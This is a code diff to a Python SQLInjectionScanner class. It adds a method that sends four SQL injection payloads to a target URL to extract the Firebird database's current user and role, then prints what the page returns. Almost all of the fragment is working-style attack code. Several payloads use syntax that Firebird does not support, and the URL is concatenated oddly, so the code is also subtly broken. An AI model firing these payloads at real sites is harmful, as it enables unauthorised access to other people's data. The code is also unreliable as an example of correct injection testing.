@@ -66,6 +66,29 @@ class SQLInjectionScanner:
 
     async def perform_firebird_get_current_user(self):
         print("Firebird: Retrieving current user...")
+        async with aiohttp.ClientSession() as session:
+            unique_responses = set()
+
+            for query in [
+                f"1' OR 1=CONVERT(int, (SELECT CURRENT_USER FROM rdb$database)); --",
+                f"1' OR 1=CONVERT(int, (SELECT CURRENT_ROLE FROM rdb$database)); --",
+                f"1' OR SUBSTRING((SELECT CURRENT_USER FROM rdb$database), 1, 1) = 'a'; --",
+                f"1' OR IF(1=1, (SELECT CURRENT_USER FROM rdb$database) LIKE 'a%', 0); --",
+            ]:
+                post_data = {}
+                full_url = f'{self.target_url}+{query}'
+
+                try:
+                    async with session.post(full_url, data=post_data) as response:
+                        result = await response.text()
+                        soup = BS(result, 'html.parser')
+                        current_user = soup.find('div', class_='current-user').text
+
+                        if current_user not in unique_responses:
+                            unique_responses.add(current_user)
+                            print(f"Firebird: Retrieving current user response for query '{query}': {current_user}")
+                except Exception as e:
+                    print(f"Firebird: Error performing POST request for query '{query}': {e}")
 
     async def perform_advantage_get_current_user(self):
         print("Advantage Database: Retrieving current user...")
